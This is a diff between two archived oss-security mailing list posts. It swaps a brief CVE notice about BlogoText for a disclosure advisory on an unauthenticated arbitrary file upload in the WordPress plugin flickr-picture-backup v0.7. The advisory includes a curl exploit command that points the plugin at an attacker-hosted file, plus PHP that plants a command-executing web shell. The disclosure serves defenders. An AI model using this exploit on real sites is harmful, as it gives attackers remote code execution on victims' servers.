@@ -1,24 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/01/3
-Message-ID: <2e0fd7c2-ceff-266e-6185-6e42bd9188e1@chbi.eu>
-Date: Sun, 1 Oct 2017 17:27:05 +0200
-From: chbi@...i.eu
-To: oss-security@...ts.openwall.com
-Subject: Re: Stored XSS vulnerability in BlogoText <= 3.7.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/30/4
+Message-id: <968B1E14-0721-4973-8564-EEA02685D040@me.com>
+Date: Sun, 30 Apr 2017 12:45:47 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7
 Content-Type: text/plain; charset=utf-8
 
-CVE-2017-14957 has been assigned.
+Title: Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-04-26
+CVE-ID:[CVE-2017-1002016]
+Download Site: https://wordpress.org/plugins/flickr-picture-backup/
+Vendor: http://daozhao.goflytoday.com/
+Vendor Notified: 2017-04-26
+Vendor Contact:
+Advisory: http://www.vapidlabs.com/advisory.php?v=190
+Description: Backup flickr’s picture which in page/post External links to flickr’s picture. 
+Vulnerability:
+The code in flickr-picture-download.php doesn't check to see if the user is authenticated or that they have permission to upload files.  It also doesn't check what type of file is being uploaded.
 
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14957
+define('WP_ADMIN', TRUE);
+require_once('../../../wp-load.php');
+require_once(ABSPATH . 'wp-admin/includes/admin.php');
+//require_once("./flickr-picture-backup.php");
+//echo "flickr-picture-download.php";
+if($_GET["url"])
+{
+    $url = $_GET["url"];
+    $fl = wp_daozhao_download_flickr_picture($url);
+    if ( is_wp_error($fl) )
+    {
+		echo  "FALSE:" . $fl->get_error_message();
+    }
+    else
+    {
+        wp_daozhao_flickr_backupfile_exists($url,$returl);
+        echo "OK:" . $returl ;
+    }
+    //echo wp_daozhao_flickr_backup_urlpath();
+    //echo "OK";
+}
 
-
--- 
-chbi
-https://chbi.eu
-
-GPG: 3DE9 9187 4BE9 EAE6 3CA8  DC20 BA7B 93F9 9037 AE7E
-     https://chbi.eu/chbi.asc
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+Export: JSON TEXT XML
+Exploit Code:
+	• $ curl http://example.com/wp-content/plugins/flickr-picture-backup/flickr-picture-download.php -d "url=http://myhost/shell.php"
+	•  
+	• Where shell.php is code to print out php web shell code, something like:
+	•  
+	• <?php
+	• echo "<?php\n\$cmd=\$_GET['cmd'];\nsystem(\$cmd);\n?>\n";
+	• ?>
+	•  
+	• Upon exploitation your shell is in:
+	•  
+	• http://example.com/wp-content/uploads/flickr_backup/shell.php
